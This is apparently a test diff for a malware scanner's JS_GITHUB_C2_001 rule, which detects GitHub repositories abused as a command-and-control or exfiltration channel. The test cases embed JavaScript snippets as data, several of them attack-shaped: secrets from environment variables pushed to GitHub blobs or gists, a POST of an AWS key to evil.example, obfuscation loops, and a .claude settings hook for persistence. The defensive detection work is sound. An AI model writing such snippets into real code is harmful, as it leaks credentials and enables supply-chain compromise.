@@ -2786,3 +2786,342 @@ func TestObfHexCount_NotSuppressedByStringExamples(t *testing.T) {
 		t.Errorf("HexIdentifierCount = %d, want > %d (real code idents counted past string examples)", m.HexIdentifierCount, hexIdentifierThreshold)
 	}
 }
+
+// TestGitHubC2 covers JS_GITHUB_C2_001: GitHub used as a write/control
+// channel plus a strong partner. A legitimate release bot
+// (createCommitOnBranch / createOrUpdateFileContents + GITHUB_TOKEN +
+// content body) must NOT fire; only a partner that legit GitHub-write
+// tooling lacks (obfuscation, execution, persistence, non-GitHub secret,
+// exfil) triggers it.
+func TestGitHubC2(t *testing.T) {
+	cases := []struct {
+		name, content string
+		want, crit    bool
+	}{
+		{
+			name: "graphql createCommitOnBranch + obfuscation",
+			content: "while(!![]){ var _0xa = 1; }\n" +
+				"const q = `mutation { createCommitOnBranch(input:{}) { commit { url } } }`;\n" +
+				"fetch('https://api.github.com/graphql', { method: 'POST', body: q });\n",
+			want: true,
+		},
+		{
+			name:    "graphql createGist + NPM_TOKEN -> CRITICAL",
+			content: "const t = process.env.NPM_TOKEN;\nconst q = 'mutation { createGist(input:{}) { url } }';\nfetch('https://api.github.com/graphql', { method:'POST', body: q });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 14 #1: octokit.graphql() send form (no literal
+			// api.github.com/graphql endpoint string).
+			name: "octokit.graphql createCommitOnBranch + obfuscation",
+			content: "while(!![]){ var _0xb = 1; }\n" +
+				"await octokit.graphql(`mutation { createCommitOnBranch(input:{}) { commit { url } } }`);\n",
+			want: true,
+		},
+		{
+			name:    "REST /git/blobs POST + Bun execution",
+			content: "require('child_process').spawn('bun', ['./stage.mjs']);\nfetch('https://api.github.com/repos/o/r/git/blobs', { method: 'POST', body });\n",
+			want:    true,
+		},
+		{
+			// url: option form: axios({ url, method }) with the endpoint as
+			// the url-keyed value.
+			name:    "axios url-option PUT /contents + Bun execution",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\naxios({ method: 'put', url: 'https://api.github.com/repos/o/r/contents/f', data });\n",
+			want:    true,
+		},
+		{
+			// codex round 11 #2: a verb-specific helper (axios.post / got.put)
+			// is itself the write, with no method: option to find.
+			name:    "axios.post /git/blobs + Bun execution",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\nawait axios.post('https://api.github.com/repos/o/r/git/blobs', payload);\n",
+			want:    true,
+		},
+		{
+			// codex round 12 #2: a verb-specific client with a url-OPTION
+			// form (request.post({ url, body })) is a write even though there
+			// is no method: field -- the .post callee is the verb.
+			name:    "request.post url-option /git/blobs + AWS secret -> CRITICAL",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nrequest.post({ url: 'https://api.github.com/repos/o/r/git/blobs', body: k });\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "octokit git.updateRef + .claude persistence",
+			content: "require('fs').writeFileSync('.claude/settings.json', hook);\nawait octokit.git.updateRef({ owner, repo, ref, sha });\n",
+			want:    true,
+		},
+		{
+			name:    "octokit createBlob + AWS secret + non-github fetch -> CRITICAL",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nawait octokit.git.createBlob({ owner, repo, content: k });\nfetch('https://evil.example/c', { method: 'POST', body: k });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 1 #3: destructured non-GitHub secret must count.
+			name:    "destructured AWS secret + github write -> CRITICAL",
+			content: "const { AWS_SECRET_ACCESS_KEY } = process.env;\nawait octokit.git.createBlob({ owner, repo, content: AWS_SECRET_ACCESS_KEY });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 2 #2: destructure with a default initializer.
+			name:    "destructured AWS secret with default + github write -> CRITICAL",
+			content: "const { AWS_SECRET_ACCESS_KEY = '' } = process.env;\nawait octokit.git.createBlob({ owner, repo, content: AWS_SECRET_ACCESS_KEY });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 2 #3: octokit.request('POST /...') route form.
+			name:    "octokit.request POST git/blobs route + Bun execution",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\nawait octokit.request('POST /repos/{owner}/{repo}/git/blobs', { owner, repo, content });\n",
+			want:    true,
+		},
+		{
+			// codex round 6: an early doc-string mention of the mutation
+			// name (no `mutation` keyword) must not suppress a later real
+			// mutation body. (Partner is Bun execution, not bare
+			// child_process -- see round 12.)
+			name: "doc mention of createGist then real mutation + Bun execution",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\n" +
+				"const help = 'see createGist docs';\n" +
+				"const q = 'mutation { createGist(input:{}) { url } }';\n" +
+				"fetch('https://api.github.com/graphql', { method:'POST', body: q });\n",
+			want: true,
+		},
+		{
+			// codex round 4 #2: a read of /contents (for a SHA) followed by
+			// a later write endpoint must still be detected.
+			name: "github contents READ then later contents WRITE + Bun",
+			content: "require('child_process').spawn('bun', ['./x.mjs']);\n" +
+				"const cur = await fetch('https://api.github.com/repos/o/r/contents/f');\n" +
+				"await fetch('https://api.github.com/repos/o/r/contents/f', { method: 'PUT', body });\n",
+			want: true,
+		},
+		// --- false positives: legitimate GitHub-write tooling ---
+		{
+			// codex round 2 #1: an env ASSIGNMENT (write) is not a read.
+			name:    "env assignment to NPM_TOKEN + github write is not a secret read",
+			content: "process.env.NPM_TOKEN = computeToken();\nawait octokit.git.createBlob({ owner, repo, content });\n",
+			want:    false,
+		},
+		{
+			// codex round 3 #1: a github mutation NAME in a doc string with
+			// no GraphQL `mutation` keyword is not a channel.
+			name:    "createGist mentioned in a doc string + child_process is not a channel",
+			content: "const help = 'call createGist to publish a snippet';\nrequire('child_process').execSync('build');\n",
+			want:    false,
+		},
+		{
+			// codex round 3 #2: a non-GitHub route that merely contains
+			// /git/blobs (no /repos/o/r/ GitHub prefix) is not a channel.
+			name:    "non-github /git/blobs route + POST + secret is not a channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://metrics.example/api/git/blobs', { method: 'POST', body: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 4 #3: a generic .createBlob on a non-octokit
+			// receiver (a DB handle) is not a GitHub write.
+			name:    "db.createBlob + AWS secret is not a github channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\ndb.createBlob({ data: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 4 #1: a route string in config, never passed to a
+			// request call, is not a write channel.
+			name:    "route string in config (no request call) + secret is not a channel",
+			content: "const route = 'POST /repos/o/r/git/blobs';\nconst k = process.env.AWS_SECRET_ACCESS_KEY;\nlog(route);\n",
+			want:    false,
+		},
+		{
+			// codex round 5 #2: a receiver merely starting with "gh"
+			// (ghost) is not an Octokit receiver.
+			name:    "ghost.createBlob + AWS secret is not a github channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nghost.createBlob({ data: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 5 #1: a stringified request example is not a real
+			// request call.
+			name:    "stringified request route example + secret is not a channel",
+			content: "const doc = \"octokit.request('POST /repos/o/r/git/blobs')\";\nconst k = process.env.AWS_SECRET_ACCESS_KEY;\n",
+			want:    false,
+		},
+		{
+			// codex round 1 #1: a local helper named createGist (code, not a
+			// GraphQL query string) is not a GitHub channel.
+			name:    "local helper named createGist + child_process is not a channel",
+			content: "function createGist(x) { return x; }\ncreateGist(1);\nrequire('child_process').execSync('build');\n",
+			want:    false,
+		},
+		{
+			// codex round 1 #2: a GET of /contents + an unrelated distant
+			// POST is not a GitHub write.
+			name: "github contents READ + unrelated distant POST is not a write",
+			content: "const u = 'https://api.github.com/repos/o/r/contents/file';\nfetch(u);\n" +
+				strings.Repeat("const filler = 1; // push the POST out of the endpoint window\n", 12) +
+				"const k = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://metrics.example/m', { method: 'POST', body: k });\n",
+			want: false,
+		},
+		{
+			name:    "release bot createCommitOnBranch + GITHUB_TOKEN + body only",
+			content: "const t = process.env.GITHUB_TOKEN;\nconst q = `mutation { createCommitOnBranch(input:{ branch, message, fileChanges }) }`;\nfetch('https://api.github.com/graphql', { method:'POST', body: q });\n",
+			want:    false,
+		},
+		{
+			name:    "release bot createOrUpdateFileContents shape",
+			content: "const token = process.env.GITHUB_TOKEN;\nawait octokit.repos.createOrUpdateFileContents({ owner, repo, path, message:'rel', content: b64, sha });\n",
+			want:    false,
+		},
+		{
+			// codex round 12 #1: a release bot routinely shells out for git
+			// metadata. Bare child_process is NOT a partner release bots
+			// lack, so execSync('git ...') + octokit write + GITHUB_TOKEN
+			// must not fire.
+			name: "release bot: git shell + octokit write + GITHUB_TOKEN is not C2",
+			content: "const token = process.env.GITHUB_TOKEN;\n" +
+				"const sha = require('child_process').execSync('git rev-parse HEAD').toString();\n" +
+				"await octokit.repos.createOrUpdateFileContents({ owner, repo, path, message:'rel', content: b64, sha });\n",
+			want: false,
+		},
+		{
+			name:    "graphql query only (no mutation)",
+			content: "const q = `query { repository(owner:$o, name:$n) { id } }`;\nfetch('https://api.github.com/graphql', { method:'POST', body: q });\nconst t = process.env.AWS_SECRET_ACCESS_KEY;\n",
+			want:    false,
+		},
+		{
+			// codex round 14 #1: a mutation FIXTURE string with no send to
+			// GitHub's GraphQL API (no endpoint, no .graphql() call) is not a
+			// channel, even with a non-GitHub secret present.
+			name:    "graphql mutation fixture string (no send) + AWS secret is not a channel",
+			content: "const example = 'mutation { createGist(input:{}) { url } }';\nconst k = process.env.AWS_SECRET_ACCESS_KEY;\nexport default example;\n",
+			want:    false,
+		},
+		{
+			// codex round 15: even when the file also NAMES the graphql
+			// endpoint as an unused constant, with no client call sending the
+			// mutation, it is not a channel.
+			name: "graphql endpoint + mutation as unused constants (no send) is not a channel",
+			content: "const endpoint = 'https://api.github.com/graphql';\n" +
+				"const q = 'mutation { createCommitOnBranch(input:{}) { commit { url } } }';\n" +
+				"const k = process.env.AWS_SECRET_ACCESS_KEY;\nexport { endpoint, q };\n",
+			want: false,
+		},
+		{
+			// codex round 14 #2: the github path is a url-keyed value inside
+			// the request BODY (second arg), the POST targets the collector.
+			name:    "github url-key inside POST body to collector is not a write",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\naxios.post('https://collector.example', { url: 'https://api.github.com/repos/o/r/git/blobs', token: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 17: a non-GitHub host that uses a GitHub-shaped
+			// /repos/.../contents path is not a GitHub write -- the REST
+			// endpoint requires the api.github.com host.
+			name:    "non-github host with github-shaped /contents path + POST is not a write",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://internal.example/repos/o/r/contents/f', { method: 'POST', body: k });\n",
+			want:    false,
+		},
+		{
+			// codex round 18 #2: an Octokit write method name on a non-GitHub
+			// receiver (api.createForAuthenticatedUser) is not a channel --
+			// the write methods require an octokit/github/gh receiver chain.
+			name:    "createForAuthenticatedUser on non-github receiver + AWS secret is not a channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\napi.createForAuthenticatedUser({ data: k });\n",
+			want:    false,
+		},
+		{
+			name:    "release/repo listing, no write",
+			content: "const t = process.env.AWS_SECRET_ACCESS_KEY;\nawait octokit.repos.listReleases({ owner, repo });\nfetch('https://api.github.com/repos/o/r/releases');\n",
+			want:    false,
+		},
+		{
+			name:    "token + api.github.com read, no write/control",
+			content: "const t = process.env.GITHUB_TOKEN;\nfetch('https://api.github.com/repos/o/r', { headers: { Authorization: 'Bearer ' + t } });\n",
+			want:    false,
+		},
+		{
+			name:    "React.createRef + child_process is not a github channel",
+			content: "import React from 'react';\nconst ref = React.createRef();\nrequire('child_process').execSync('build');\n",
+			want:    false,
+		},
+		{
+			name:    "github write mutation only in a comment",
+			content: "// uses octokit.git.createBlob and createCommitOnBranch under the hood\nrequire('child_process').execSync('x');\n",
+			want:    false,
+		},
+		{
+			// codex round 7 #1: a whole-process env dump is a strong
+			// (non-GitHub) secret read, so it is the credential-exfil-via
+			// -GitHub shape -> CRITICAL.
+			name:    "JSON.stringify(process.env) + github write -> CRITICAL",
+			content: "await octokit.git.createBlob({ owner, repo, content: JSON.stringify(process.env) });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 7 #2: a variable that merely stores a mutation
+			// NAME (`mutationName`) is not a GraphQL mutation body; the
+			// `mutation` substring lives in an identifier, not the string.
+			name:    "const mutationName = 'createGist' + child_process is not a channel",
+			content: "const mutationName = 'createGist';\nrequire('child_process').execSync('build');\nlog(mutationName);\n",
+			want:    false,
+		},
+		{
+			// codex round 8: a read-only GitHub /contents fetch plus an
+			// unrelated POST to a DIFFERENT host is not a github write -- the
+			// method must be in the same request as the github endpoint.
+			name: "github contents READ + POST to different host is not a write",
+			content: "const cur = await fetch('https://api.github.com/repos/o/r/contents/f');\n" +
+				"const k = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+				"await fetch('https://evil.example/m', { method: 'POST', body: k });\n",
+			want: false,
+		},
+		{
+			// codex round 9: the GitHub path is a body VALUE (data), the POST
+			// targets a collector. The endpoint must be the request URL, not
+			// a string sitting in the request body.
+			name: "github path as POST body to collector is not a write channel",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+				"fetch('https://collector.example', { method: 'POST', body: 'https://api.github.com/repos/o/r/git/blobs' });\n",
+			want: false,
+		},
+		{
+			// codex round 10 #1: a single dynamic key read process.env[k]
+			// (resolving to GITHUB_TOKEN) is the release-bot shape, not a
+			// whole-env dump -- not a strong non-GitHub secret partner.
+			name: "github write + dynamic process.env[k] read is not a strong secret",
+			content: "const name = 'GITHUB_TOKEN';\nconst t = process.env[name];\n" +
+				"await octokit.git.createBlob({ owner, repo, content, headers: { authorization: t } });\n",
+			want: false,
+		},
+		{
+			// codex round 10 #2: a `method` field nested in the request body
+			// (not the top-level options object) on a read-only GitHub URL is
+			// not the HTTP verb.
+			name: "read-only github URL with nested body.method is not a write",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+				"fetch('https://api.github.com/repos/o/r/contents/f', { body: { method: 'POST' } });\n",
+			want: false,
+		},
+		{
+			// codex round 11 #1: a github URL passed as the first arg of a
+			// non-HTTP callee (console.log) is not a request, even with a
+			// method-shaped object alongside it.
+			name: "console.log of github URL + method-shaped object is not a write",
+			content: "const k = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+				"console.log('https://api.github.com/repos/o/r/git/blobs', { method: 'POST' });\n",
+			want: false,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			findings := analyze(t, "index.js", c.content)
+			got := hasRule(findings, RuleGitHubC2)
+			if got != c.want {
+				t.Fatalf("JS_GITHUB_C2_001 present = %v, want %v (findings: %+v)", got, c.want, findings)
+			}
+			if c.want && c.crit {
+				f := findRule(findings, RuleGitHubC2)
+				if f == nil || f.Severity != types.SeverityCritical {
+					t.Errorf("expected CRITICAL, got %+v", f)
+				}
+			}
+		})
+	}
+}
